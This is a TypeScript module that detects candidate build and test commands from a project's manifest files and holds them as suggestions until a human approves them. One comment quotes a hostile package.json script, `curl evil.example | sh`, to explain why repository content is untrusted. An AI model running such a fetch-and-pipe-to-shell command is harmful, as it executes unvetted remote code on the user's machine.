import { existsSync, readFileSync, statSync } from "node:fs"
import { join, resolve } from "node:path"
import type { DetectedGate, GateKind } from "./types.ts"

/**
 * Gate detection.
 *
 * This is the plan's "defaults perform **detection only**, not execution".
 *
 * It reads a project's own manifest files and reports which gates *could* be
 * run. It never runs anything, and it never trusts what it finds: a
 * `package.json` script discovered here is a **suggestion**, not a gate. A
 * gate only exists once a human has reviewed and approved it.
 *
 * The distinction matters. A repository is untrusted input. A
 * `package.json` can say `"test": "curl evil.example | sh"`, and reading it
 * is fine — *running* it is not.
 */

/** The manifest files detection looks at, and the gate each implies. */
interface ManifestRule {
  /** The file, relative to the project root. */
  file: string
  /** The gate kind this manifest implies. */
  kind: GateKind
  /** How to read the command out of it. */
  read: (content: string) => { executable: string; args: string[] } | undefined
  /** The description shown to a human. */
  description: string
}

/**
 * A package manager script, as an argv.
 *
 * `npm test` runs `npm run test`, which runs the script named `test` in
 * `package.json`. The argv is `npm run <script>`, never the script's own
 * body — the body may be anything at all, and a human reviews it separately.
 */
function packageScript(content: string, name: string): { executable: string; args: string[] } | undefined {
  let parsed: { scripts?: Record<string, string> }
  try {
    parsed = JSON.parse(content)
  } catch {
    // A package.json that is not JSON is not a manifest we can read.
    return undefined
  }
  if (!parsed.scripts || typeof parsed.scripts[name] !== "string") return undefined
  return { executable: "npm", args: ["run", name] }
}

const RULES: ManifestRule[] = [
  {
    file: "package.json",
    kind: "test",
    read: (content) => packageScript(content, "test"),
    description: "Run the project's test script.",
  },
  {
    file: "package.json",
    kind: "typecheck",
    read: (content) => packageScript(content, "typecheck"),
    description: "Run the project's typecheck script.",
  },
  {
    file: "package.json",
    kind: "lint",
    read: (content) => packageScript(content, "lint"),
    description: "Run the project's lint script.",
  },
  {
    file: "package.json",
    kind: "build",
    read: (content) => packageScript(content, "build"),
    description: "Run the project's build script.",
  },
  {
    file: "go.mod",
    kind: "test",
    read: () => ({ executable: "go", args: ["test", "./..."] }),
    description: "Run the Go tests.",
  },
  {
    file: "go.mod",
    kind: "build",
    read: () => ({ executable: "go", args: ["build", "./..."] }),
    description: "Build the Go packages.",
  },
  {
    file: "Makefile",
    kind: "test",
    read: (content) => (/(^|\n)test\s*:/m.test(content) ? { executable: "make", args: ["test"] } : undefined),
    description: "Run the Makefile's test target.",
  },
  {
    file: "Makefile",
    kind: "build",
    read: (content) => (/(^|\n)build\s*:/m.test(content) ? { executable: "make", args: ["build"] } : undefined),
    description: "Run the Makefile's build target.",
  },
  {
    file: "Cargo.toml",
    kind: "test",
    read: () => ({ executable: "cargo", args: ["test"] }),
    description: "Run the Rust tests.",
  },
  {
    file: "Cargo.toml",
    kind: "build",
    read: () => ({ executable: "cargo", args: ["build"] }),
    description: "Build the Rust crate.",
  },
]

/**
 * Which gates does this project look like it has?
 *
 * The result is a set of **suggestions**. Each one must be reviewed and
 * approved before it can run, and approving it is a human's decision.
 */
export function detectGates(root: string): DetectedGate[] {
  const absoluteRoot = resolve(root)
  const found = new Map<string, DetectedGate>()

  for (const rule of RULES) {
    const path = join(absoluteRoot, rule.file)
    if (!existsSync(path)) continue

    let content: string
    try {
      const info = statSync(path)
      if (!info.isFile()) continue
      content = readFileSync(path, "utf8")
    } catch {
      continue
    }

    const command = rule.read(content)
    if (!command) continue

    const id = `${rule.kind}-${rule.file.replace(/\W+/g, "-").toLowerCase()}`
    if (found.has(id)) continue
    found.set(id, {
      id,
      kind: rule.kind,
      description: rule.description,
      executable: command.executable,
      args: command.args,
      reason: `The project has a ${rule.file}.`,
      // Whether the program exists is a separate question from whether the
      // project declares the gate. A missing `cargo` on a Rust project means
      // the gate is not runnable *here*, not that the project lacks it.
      runnable: existsInPath(command.executable, absoluteRoot),
    })
  }

  return [...found.values()]
}

/**
 * Is the executable available?
 *
 * A bare name is looked up in `PATH` and in the project's own
 * `node_modules/.bin`. A path inside the project is **not** trusted: a
 * repository can ship an executable called `go`.
 */
function existsInPath(executable: string, root: string): boolean {
  if (executable.includes("/")) {
    try {
      return statSync(executable).isFile()
    } catch {
      return false
    }
  }
  const searchPath = (process.env.PATH ?? "").split(":").filter(Boolean)
  const local = join(root, "node_modules", ".bin", executable)
  if (existsSync(local)) return true
  return searchPath.some((directory) => {
    const candidate = join(directory, executable)
    try {
      return statSync(candidate).isFile()
    } catch {
      return false
    }
  })
}
